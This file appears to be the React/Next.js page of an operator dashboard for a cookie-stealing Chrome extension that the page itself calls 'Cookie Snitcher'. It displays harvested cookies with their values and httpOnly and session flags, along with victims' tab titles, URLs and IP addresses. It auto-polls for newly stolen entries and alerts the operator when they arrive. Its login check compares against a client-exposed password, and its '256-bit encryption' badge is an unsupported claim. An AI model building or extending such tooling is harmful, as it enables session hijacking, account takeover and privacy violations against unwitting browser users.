"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import CookieTable from "@/components/CookieTable";
import Pagination from "@/components/Pagination";
import FilterBar from "@/components/FilterBar";
import ToastNotification from "@/components/ToastNotification";
import {
  fetchCookiesWithMetadata,
  checkForNewCookies,
} from "@/services/CookieService";

type CookieEntry = {
  id: number;
  url: string;
  tabId: number;
  tabTitle: string | null;
  favIconUrl: string | null;
  cookiesData: {
    name: string;
    value: string;
    domain: string;
    path: string;
    secure: boolean;
    httpOnly: boolean;
    hostOnly: boolean;
    sameSite: string;
    session: boolean;
    storeId: string;
  }[];
  ipAddress: string | null;
  createdAt: string;
};

type PaginationData = {
  page: number;
  limit: number;
  total: number;
  pages: number;
};

export default function Home() {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [error, setError] = useState("");

  const [cookieEntries, setCookieEntries] = useState<CookieEntry[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [pagination, setPagination] = useState<PaginationData>({
    page: 1,
    limit: 25,
    total: 0,
    pages: 0,
  });
  const [urlFilter, setUrlFilter] = useState("");
  const lastFetchTimeRef = useRef<number>(0);
  const [isBackgroundRefreshing, setIsBackgroundRefreshing] = useState(false);
  const [toast, setToast] = useState({
    isVisible: false,
    message: "",
    type: "info" as "success" | "error" | "info",
  });
  const previousTotalRef = useRef<number>(0);

  const handleLogin = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    // Replace 'YOUR_HARDCODED_PASSWORD' with the actual environment variable name
    // Make sure to add DASHBOARD_PASSWORD to your .env file
    if (password === process.env.NEXT_PUBLIC_DASHBOARD_PASSWORD) {
      setIsAuthenticated(true);
      setError("");
    } else {
      setError("Incorrect password");
    }
  };

  // Memoize the fetchCookies function so it doesn't change on every render
  const fetchCookies = useCallback(
    async (page = 1, url = "", silent = false) => {
      if (!silent) {
        setIsLoading(true);
      } else {
        setIsBackgroundRefreshing(true);
      }

      try {
        const result = await fetchCookiesWithMetadata(
          page,
          pagination.limit,
          url
        );
        lastFetchTimeRef.current = Date.now();

        if (result.success) {
          // Store the previous total for comparison
          const prevTotal = previousTotalRef.current;
          previousTotalRef.current = result.pagination?.total || 0;

          setCookieEntries(result.entries);
          if (result.pagination) {
            setPagination(result.pagination);

            // Check if new cookies were added (and not the first load)
            if (
              prevTotal > 0 &&
              result.pagination.total > prevTotal &&
              silent
            ) {
              const newCount = result.pagination.total - prevTotal;
              setToast({
                isVisible: true,
                message: `${newCount} new cookie${
                  newCount === 1 ? "" : "s"
                } detected!`,
                type: "info",
              });
            }
          }
        } else {
          console.error("Failed to fetch cookies:", result.error);
        }
      } catch (error) {
        console.error("Error fetching cookies:", error);
      } finally {
        if (!silent) {
          setIsLoading(false);
        } else {
          setIsBackgroundRefreshing(false);
        }
      }
    },
    [pagination.limit]
  );

  // When component mounts, store the initial pagination total
  useEffect(() => {
    previousTotalRef.current = pagination.total;
  }, [pagination.total]);

  // Initial data fetch
  useEffect(() => {
    // Only fetch data if authenticated
    if (isAuthenticated) {
      fetchCookies(1, urlFilter);
    }
  }, [fetchCookies, urlFilter, isAuthenticated]); // Add isAuthenticated as a dependency

  // Setup auto-refresh interval
  useEffect(() => {
    let checkInterval: NodeJS.Timeout | null = null;
    let fullRefreshInterval: NodeJS.Timeout | null = null;

    // Only set up intervals if authenticated
    if (isAuthenticated) {
      // First, set up the check for new data (light polling)
      checkInterval = setInterval(async () => {
        // Only check if not already loading
        if (!isLoading) {
          try {
            const result = await checkForNewCookies();

            // If there are new cookies or changes to the total count, refresh the data
            if (
              result.success &&
              (result.hasNewCookies || result.total !== pagination.total)
            ) {
              console.log("New data detected, refreshing...");
              fetchCookies(pagination.page, urlFilter, true);
            }
          } catch (error) {
            console.error("Error checking for updates:", error);
          }
        }
      }, 10000); // Check every 10 seconds

      // Set up a full refresh interval as a backup (less frequent)
      fullRefreshInterval = setInterval(() => {
        if (!isLoading) {
          fetchCookies(pagination.page, urlFilter, true);
        }
      }, 3600000); // Full refresh every 60 minutes (3600000 ms)
    }


    // Clean up intervals on component unmount or when isAuthenticated changes to false
    return () => {
      if (checkInterval) {
        clearInterval(checkInterval);
      }
      if (fullRefreshInterval) {
        clearInterval(fullRefreshInterval);
      }
    };
  }, [fetchCookies, isLoading, pagination.page, pagination.total, urlFilter, isAuthenticated]); // Add isAuthenticated as a dependency

  const handlePageChange = (page: number) => {
    fetchCookies(page, urlFilter);
  };

  const handleFilter = (url: string) => {
    setUrlFilter(url);
    fetchCookies(1, url);
  };

  // Handle entry deletion
  const handleEntryDeleted = (id: number) => {
    // Update the local state to remove the deleted entry
    setCookieEntries((prevEntries) =>
      prevEntries.filter((entry) => entry.id !== id)
    );
    // Update pagination total
    setPagination((prevPagination) => ({
      ...prevPagination,
      total: prevPagination.total - 1,
      pages: Math.ceil((prevPagination.total - 1) / prevPagination.limit),
    }));

    // If current page is now empty (except for the last page), go to previous page
    if (
      cookieEntries.length === 1 &&
      pagination.page > 1 &&
      pagination.page === pagination.pages
    ) {
      handlePageChange(pagination.page - 1);
    } else {
      // Otherwise, just refresh the current page
      fetchCookies(pagination.page, urlFilter);
    }
  };

  // Add a manual refresh button function
  const handleManualRefresh = () => {
    fetchCookies(pagination.page, urlFilter);
  };

  if (!isAuthenticated) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-tr from-black to-red-950 text-white relative overflow-hidden">
        {/* Background decorative elements */}
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-red-900 rounded-full blur-3xl"></div>
          <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-red-800 rounded-full blur-3xl"></div>
        </div>

        <div className="bg-black/30 backdrop-blur-lg border border-red-900/20 p-8 rounded-2xl shadow-2xl w-full max-w-md relative z-10">
          {/* Glowing border effect */}
          <div className="absolute inset-0 bg-gradient-to-r from-red-600/20 via-transparent to-red-600/20 rounded-2xl blur-sm"></div>

          <div className="relative">
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-tr from-red-600 to-red-800 rounded-full mb-4 shadow-lg">
                <svg
                  className="w-8 h-8 text-white"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>
              <h1 className="text-3xl font-bold bg-gradient-to-r from-white to-red-200 bg-clip-text text-transparent">
                Secure Access
              </h1>
              <p className="text-red-300/80 text-sm mt-2">
                Enter your credentials to continue
              </p>
            </div>

            <form onSubmit={handleLogin} className="space-y-6">
              <div className="space-y-2">
                <label
                  htmlFor="password"
                  className="block text-red-200 text-sm font-semibold"
                >
                  Password
                </label>
                <div className="relative">
                  <input
                    type="password"
                    id="password"
                    className="w-full py-3 px-4 bg-black/50 border border-red-800/30 rounded-lg text-white placeholder-red-400/50 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all duration-300 backdrop-blur-sm"
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                  <div className="absolute inset-0 rounded-lg bg-gradient-to-r from-red-600/10 via-transparent to-red-600/10 pointer-events-none"></div>
                </div>
              </div>

              {error && (
                <div className="bg-red-900/20 border border-red-700/30 rounded-lg p-3 backdrop-blur-sm">
                  <p className="text-red-300 text-sm flex items-center">
                    <svg
                      className="w-4 h-4 mr-2"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                        clipRule="evenodd"
                      />
                    </svg>
                    {error}
                  </p>
                </div>
              )}

              <button
                type="submit"
                className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-3 px-6 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 focus:ring-offset-black transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-red-600/25"
              >
                <span className="flex items-center justify-center">
                  <svg
                    className="w-5 h-5 mr-2"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"
                    />
                  </svg>
                  Access Dashboard
                </span>
              </button>
            </form>

            {/* Additional security indicator */}
            <div className="mt-6 pt-6 border-t border-red-800/20">
              <div className="flex items-center justify-center text-red-400/60 text-xs">
                <svg
                  className="w-3 h-3 mr-1"
                  fill="currentColor"
                  viewBox="0 0 20 20"
                >
                  <path
                    fillRule="evenodd"
                    d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                    clipRule="evenodd"
                  />
                </svg>
                Secured with 256-bit encryption
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div>
      <div className="mb-8">
        <h1 className="text-3xl font-bold mb-2">Cookie Tracker Dashboard</h1>
        <p className="text-gray-400">
          View and analyze cookies captured by the Cookie Snitcher Chrome
          Extension.
        </p>
      </div>

      <div className="flex justify-between gap-12 items-center mb-4">
        <FilterBar onFilter={handleFilter} />

        <button
          onClick={handleManualRefresh}
          className="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded flex items-center"
          disabled={isLoading}
        >
          <svg
            className={`w-4 h-4 mr-2 ${
              isBackgroundRefreshing ? "animate-spin" : ""
            }`}
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
            ></path>
          </svg>
          {isBackgroundRefreshing ? "Refreshing..." : "Refresh"}
        </button>
      </div>

      <div className="bg-gray-900 rounded-lg shadow-lg overflow-hidden">
        <CookieTable
          entries={cookieEntries}
          isLoading={isLoading}
          refreshCookies={() => fetchCookies(pagination.page, urlFilter)}
          onEntryDeleted={handleEntryDeleted}
        />

        {!isLoading && cookieEntries.length > 0 && (
          <div className="bg-gray-900 border-t border-gray-800 p-4">
            <Pagination
              currentPage={pagination.page}
              totalPages={pagination.pages}
              onPageChange={handlePageChange}
            />
          </div>
        )}
      </div>

      {cookieEntries.length > 0 && (
        <div className="mt-6 text-sm text-gray-500">
          <div className="flex justify-between items-center">
            <span>
              Showing {cookieEntries.length} of {pagination.total} entries
            </span>
            <div className="flex items-center">
              <span
                className={`inline-block w-2 h-2 rounded-full mr-2 ${
                  isBackgroundRefreshing
                    ? "bg-green-500 animate-pulse"
                    : "bg-gray-500"
                }`}
              ></span>
              <span>
                Auto-refresh:{" "}
                {isBackgroundRefreshing ? "Checking for updates..." : "Active"}
              </span>
            </div>
          </div>
          <div className="mt-1 text-xs text-gray-600">
            Last refreshed:{" "}
            {new Date(lastFetchTimeRef.current).toLocaleTimeString()}
          </div>
        </div>
      )}

      <ToastNotification
        isVisible={toast.isVisible}
        message={toast.message}
        type={toast.type}
        duration={5000}
        onClose={() => setToast((prev) => ({ ...prev, isVisible: false }))}
      />
    </div>
  );
}
